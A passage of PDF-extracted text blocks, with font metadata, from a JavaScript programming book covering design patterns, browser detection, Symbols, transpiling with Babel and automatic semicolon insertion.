        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 351",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "    getDoublePrivateData :  getDoublePrivateData    };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "})( /* pass initialization data if necessary */ );",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Revealing Prototype Pattern",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "This variation of the revealing pattern is used to separate the constructor to the methods. This pattern allow us to use the javascript language like a objected oriented language:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "//Namespace setting",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  NavigationNs  =  NavigationNs  ||   {};",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// This is used as a class constructor",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "NavigationNs. active   =   function ( current ,  length )   {               this . current   =  current ;      this . length   =  length ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// The prototype is used to separate the construct and the methods    ",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "NavigationNs. active . prototype   =   function ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // It is an example of a public method because is revealed in the return statement",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     var  setCurrent  =   function ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         //Here the variables current and length are used as private class properties  ",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         for   ( var  i  =   0 ;  i  <   this . length ;  i ++)   {                                  $ ( this . current ) . addClass ( 'active' );                           }      }      return   {  setCurrent :  setCurrent  }; }();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Example of parameterless constructor  ",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "NavigationNs. pagination   =   function ()   {} NavigationNs. pagination . prototype   =   function ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// It is a example of an private method because is not revealed in the return statement",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     var  reload  =   function ( data )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         // do something",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     },",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // It the only public method, because it the only function referenced in the return statement",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     getPage  =   function ( link )   {          var  a  =  $ ( link );          var  options  =   { url :  a. attr ( 'href' ),  type :   'get' }         $. ajax ( options ) . done ( function ( data )   {             ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "            // after the ajax call is done, it calls private method",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "           reload ( data );          });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         return   false ;",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     }      return   { getPage  :  getPage } }();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This code above should be in a separated \ufb01le .js to be referenced in any page that is needed. It can be used like this:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  menuActive  =   new  NavigationNs. active ( 'ul.sidebar-menu li' ,   5 ); menuActive. setCurrent ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 352",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 65.4: Prototype Pattern",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The prototype pattern focuses on creating an object that can be used as a blueprint for other objects through prototypal inheritance. This pattern is inherently easy to work with in JavaScript because of the native support for prototypal inheritance in JS which means we don't need to spend time or e\ufb00ort imitating this topology.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Creating methods on the prototype",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  Welcome ( name )   {    this . name   =  name ; } Welcome. prototype . sayHello   =   function ()   {    return   'Hello, '   +   this . name   +   '!' ; } var  welcome  =   new  Welcome ( 'John' ); welcome. sayHello ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// => Hello, John!",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Prototypal Inheritance",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Inheriting from a 'parent object' is relatively easy via the following pattern",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "ChildObject. prototype   =  Object. create ( ParentObject. prototype ); ChildObject. prototype . constructor   =  ChildObject ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Where  ParentObject  is the object you wish to inherit the prototyped functions from, and  ChildObject  is the new Object you wish to put them on. If the parent object has values it initializes in its constructor you need to call the parents constructor when initializing the child. You do that using the following pattern in the  ChildObject  constructor.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  ChildObject ( value )   {     ParentObject. call ( this ,  value ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "A complete example where the above is implemented",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  RoomService ( name ,  order )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // this.name will be set and made available on the scope of this function",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  Welcome. call ( this ,  name );    this . order   =  order ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Inherit 'sayHello()' methods from 'Welcome' prototype",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "RoomService. prototype   =  Object. create ( Welcome. prototype );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// By default prototype object has 'constructor' property. // But as we created new object without this property  -  we have to set it manually, // otherwise 'constructor' property will point to 'Welcome' class",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "RoomService. prototype . constructor   =  RoomService ; RoomService. prototype . announceDelivery   =   function ()   {    return   'Your '   +   this . order   +   ' has arrived!' ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 353",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "RoomService. prototype . deliverOrder   =   function ()   {    return   this . sayHello ()   +   ' '   +   this . announceDelivery (); } var  delivery  =   new  RoomService ( 'John' ,   'pizza' ); delivery. sayHello ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// => Hello, John!,",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "delivery. announceDelivery ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Your pizza has arrived!",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "delivery. deliverOrder ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// => Hello, John! Your pizza has arrived!",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 65.5: Singleton Pattern",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The Singleton pattern is a design pattern that restricts the instantiation of a class to one object. After the \ufb01rst object is created, it will return the reference to the same one whenever called for an object.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  Singleton  =   ( function   ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         // instance stores a reference to the Singleton",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         var  instance ;              function  createInstance ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "             // private variables and methods",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "             var  _privateVariable  =   'I am a private variable' ;              function  _privateMethod ()   {                 console. log ( 'I am a private method' );              }              return   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "                 // public methods and variables",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "                publicMethod :   function ()   {                     console. log ( 'I am a public method' );                  },                 publicVariable :   'I am a public variable'              };          }                    return   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "             // Get the Singleton instance if it exists              // or create one if doesn't",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "            getInstance :   function   ()   {                  if   (! instance )   {                     instance  =  createInstance ();                  }                  return  instance ;              }          };      })();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Usage:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// there is no existing instance of Singleton, so it will create one",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  instance1  =  Singleton. getInstance ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// there is an instance of Singleton, so it will return the reference to this one",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  instance2  =  Singleton. getInstance (); console. log ( instance1  ===  instance2 );   // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 354",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 65.6: Abstract Factory Pattern",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The Abstract Factory Pattern is a creational design pattern that can be used to de\ufb01ne speci\ufb01c instances or classes without having to specify the exact object that is being created.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  Car ()   {   this . name   =   \"Car\" ;   this . wheels   =   4 ;   } function  Truck ()   {   this . name   =   \"Truck\" ;   this . wheels   =   6 ;   } function  Bike ()   {   this . name   =   \"Bike\" ;   this . wheels   =   2 ;   } const  vehicleFactory  =   {     createVehicle :   function   ( type )   {          switch   ( type. toLowerCase ())   {              case   \"car\" :                  return   new  Car ();              case   \"truck\" :                  return   new  Truck ();              case   \"bike\" :                  return   new  Bike ();              default :                  return   null ;          }      } }; const  car  =  vehicleFactory. createVehicle ( \"Car\" );   // Car { name: \"Car\", wheels: 4 }   const  truck  =  vehicleFactory. createVehicle ( \"Truck\" );   // Truck { name: \"Truck\", wheels: 6 }   const  bike  =  vehicleFactory. createVehicle ( \"Bike\" );   // Bike { name: \"Bike\", wheels: 2 }   const  unknown  =  vehicleFactory. createVehicle ( \"Boat\" );   // null ( Vehicle not known )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 355",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 66: Detecting browser",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Browsers, as they have evolved, o\ufb00ered more features to JavaScript. But often these features are not available in all browsers. Sometimes they may be available in one browser, but yet to be released on other browsers. Other times, these features are implemented di\ufb00erently by di\ufb00erent browsers. Browser detection becomes important to ensure that the application you develop runs smoothly across di\ufb00erent browsers and devices.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 66.1: Feature Detection Method",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "This method looks for the existence of browser speci\ufb01c things. This would be more di\ufb03cult to spoof, but is not guaranteed to be future proof.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Opera 8.0+",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  isOpera  =   (!! window. opr   &&   !! opr. addons )   ||   !! window. opera   ||  navigator. userAgent . indexOf ( ' OPR/' )   >=   0 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Firefox 1.0+",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  isFirefox  =   typeof  InstallTrigger  !==   'undefined' ;    ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// At least Safari 3+: \"[object HTMLElementConstructor]\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  isSafari  =  Object. prototype . toString . call ( window. HTMLElement ) . indexOf ( 'Constructor' )   >   0 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Internet Explorer 6-11",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  isIE  =   /*@cc_on!@*/ false   ||   !! document. documentMode ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Edge 20+",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  isEdge  =   ! isIE  &&   !! window. StyleMedia ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Chrome 1+",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  isChrome  =   !! window. chrome   &&   !! window. chrome . webstore ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Blink engine detection",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  isBlink  =   ( isChrome  ||  isOpera )   &&   !! window. CSS ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Successfully tested in: Firefox 0.8 - 44 Chrome 1.0 - 48 Opera 8.0 - 34 Safari 3.0 - 9.0.3 IE 6 - 11 Edge - 20-25 Credit to  Rob W",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 66.2: User Agent Detection",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "This method gets the user agent and parses it to \ufb01nd the browser. The browser name and version are extracted from the user agent through a regex. Based on these two, the  <browser  name >   <version>  is returned. The four conditional blocks following the user agent matching code are meant to account for di\ufb00erences in the user agents of di\ufb00erent browsers. For example, in case of opera,  since it uses Chrome rendering engine , there is an additional step of ignoring that part. Note that this method can be easily spoofed by a user.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 356",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "navigator. sayswho =   ( function (){      var  ua =  navigator. userAgent ,  tem ,",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    M =  ua. match ( /(opera|chrome|safari|firefox|msie|trident(?=\\/))\\/?\\s*(\\d+)/i )   ||   [];",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     if ( /trident/i . test ( M [ 1 ])){         tem =    /\\brv[ :]+(\\d+)/g . exec ( ua )   ||   [];          return   'IE ' +( tem [ 1 ]   ||   '' );      }      if ( M [ 1 ]===   'Chrome' ){         tem =  ua. match ( /\\b(OPR|Edge)\\/(\\d+)/ );          if ( tem !=   null )   return  tem. slice ( 1 ) . join ( ' ' ) . replace ( 'OPR' ,   'Opera' );      }     M =  M [ 2 ]?   [ M [ 1 ],  M [ 2 ]]:   [ navigator. appName ,  navigator. appVersion ,   '-?' ];      if (( tem =  ua. match ( /version\\/(\\d+)/i ))!=   null )  M. splice ( 1 ,   1 ,  tem [ 1 ]);      return  M. join ( ' ' ); })();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Credit to  kennebec",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 66.3: Library Method",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "An easier approach for some would be to use an existing JavaScript library. This is because it can be tricky to guarantee browser detection is correct, so it can make sense to use a working solution if one is available. One popular browser-detection library is  Bowser . Usage example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if   ( bowser. msie   &&  bowser. version   >=   6 )   {     alert ( 'IE version 6 or newer' ); } else   if   ( bowser. firefox )   {     alert ( 'Firefox' ); }      else   if   ( bowser. chrome )   {     alert ( 'Chrome' ); } else   if   ( bowser. safari )   {     alert ( 'Safari' ); } else   if   ( bowser. iphone   ||  bowser. android )   {     alert ( 'iPhone or Android' ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 357",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 67: Symbols",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 67.1: Basics of symbol primitive type",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Symbol  is a new primitive type in ES6. Symbols are used mainly as  property keys , and one of its main characteristics is that they are  unique , even if they have the same description. This means they will never have a name clash with any other property key that is a  symbol  or  string .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  MY_PROP_KEY  =  Symbol (); const  obj  =   {}; obj [ MY_PROP_KEY ]   =   \"ABC\" ; console. log ( obj [ MY_PROP_KEY ]);",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In this example, the result of  console. log  would be  ABC . You can also have named Symbols like:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  APPLE     =  Symbol ( 'Apple' ); const  BANANA    =  Symbol ( 'Banana' ); const  GRAPE     =  Symbol ( 'Grape' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Each of these values are unique and cannot be overridden. Providing an optional parameter  ( description )  when creating primitive symbols can be used for debugging but not to access the symbol itself (but see the  Symbol. for ()  example for a way to register/lookup global shared symbols).",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 67.2: Using Symbol.for() to create global, shared symbols",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The  Symbol. for  method allows you to register and look up global symbols by name. The \ufb01rst time it is called with a given key, it creates a new symbol and adds it to the registry.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  a  =  Symbol. for ( 'A' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The next time you call  Symbol. for ( 'A' ) , the  same symbol  will be returned instead of a new one (in contrast to Symbol ( 'A' )  which would create a new, unique symbol that happens to have the same description).",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "a  ===  Symbol. for ( 'A' )   // true but a  ===  Symbol ( 'A' )   // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 67.3: Converting a symbol into a string",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Unlike most other JavaScript objects, symbols are not automatically converted into a string when performing concatenation.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  apple  =  Symbol ( 'Apple' )   +   '' ;   // throws TypeError!",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Instead, they have to be explicitly converted into a string when necessary, (for example, to get a textual description",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 358",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "of the symbol that can be used in a debug message) using the  toString  method or the  String  constructor.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  APPLE  =  Symbol ( 'Apple' ); let  str1  =  APPLE. toString ();   // \"Symbol(Apple)\" let  str2  =  String ( APPLE );      // \"Symbol(Apple)\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 359",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 68: Transpiling",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Transpiling is the process of interpreting certain programming languages and translating it to a speci\ufb01c target language. In this context, transpiling will take  compile-to-JS languages  and translate them into the  target  language of JavaScript.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 68.1: Introduction to Transpiling",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Examples ES6/ES2015 to ES5 (via  Babel ) :",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "This ES2015 syntax",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// ES2015 arrow function syntax",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "[ 1 , 2 , 3 ] . map ( n  =>  n  +   1 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "is interpreted and translated to this ES5 syntax:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Conventional ES5 anonymous function syntax",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "[ 1 , 2 , 3 ] . map ( function ( n )   {         return  n  +   1 ; });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Co\ufb00eeScript to JavaScript (via built-in Co\ufb00eeScript compiler) :",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "This Co\ufb00eeScript",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "# Existence : alert  \"I knew it!\"   if  elvis ?",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "is interpreted and translated to JavaScript:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if   ( typeof  elvis  !==   \"undefined\"   &&  elvis  !==   null )   {   alert ( \"I knew it!\" ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "How do I transpile?",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Most compile-to-JavaScript languages have a transpiler  built-in  (like in Co\ufb00eeScript or TypeScript). In this case, you may just need to enable the language's transpiler via con\ufb01g settings or a checkbox. Advanced settings can also be set in relation to the transpiler. For  ES6/ES2016-to-ES5 transpiling , the most prominent transpiler being used is  Babel .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Why should I transpile?",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The most cited bene\ufb01ts include: The ability to use newer syntax reliably Compatibility among most, if not all browsers Usage of missing/not yet native features to JavaScript via languages like Co\ufb00eeScript or TypeScript",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 360",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 68.2: Start using ES6/7 with Babel",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Browser support for ES6  is growing, but to be sure your code will work on environments that don't fully support it, you can use  Babel , the ES6/7 to ES5 transpiler,  try it out! If you would like to use ES6/7 in your projects without having to worry about compatibility, you can use  Node  and Babel CLI",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Quick setup of a project with Babel for ES6/7 support",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Download  and install Node 1. Go to a folder and create a project using your favourite command line tool 2.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "~ npm init",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Install Babel CLI 3.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "~ npm  install   --save-dev  babel-cli ~ npm  install   --save-dev  babel-preset-es2015",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Create a  scripts  folder to store your  . js  \ufb01les, and then a  dist / scripts  folder where the transpiled fully 4. compatible \ufb01les will be stored. Create a  . babelrc  \ufb01le in the root folder of your project, and write this on it 5. {",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "     \"presets\" :   [ \"es2015\" ] }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Edit your  package. json  \ufb01le (created when you ran  npm init ) and add the  build  script to the  scripts 6. property: {",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "    ...      \"scripts\" :   {     ...  ,      \"build\" :   \"babel scripts --out-dir dist/scripts\"      },     ... }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Enjoy  programming in ES6/7 7. Run the following to transpile all your \ufb01les to ES5 8.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "~ npm run build",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "For more complex projects you might want to take a look at  Gulp  or  Webpack",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 361",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 69: Automatic Semicolon Insertion - ASI",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 69.1: Avoid semicolon insertion on return statements",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The JavaScript coding convention is to place the starting bracket of blocks on the same line of their declaration:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if   ( ... )   { } function   ( a ,  b ,  ... )   { }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Instead of in the next line:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if   ( ... ) { } function   ( a ,  b ,  ... ) { }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This has been adopted to avoid semicolon insertion in return statements that return objects:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  foo () {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     return   // A semicolon will be inserted here, making the function return nothing",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     {         foo :   'foo'      }; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "foo ();   // undefined",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  properFoo ()   {      return   {         foo :   'foo'      }; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "properFoo ();   // { foo: 'foo' }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In most languages the placement of the starting bracket is just a matter of personal preference, as it has no real impact on the execution of the code. In JavaScript, as you've seen, placing the initial bracket in the next line can lead to silent errors.",
        "font_name": "OpenSans",
        "font_size": 10,
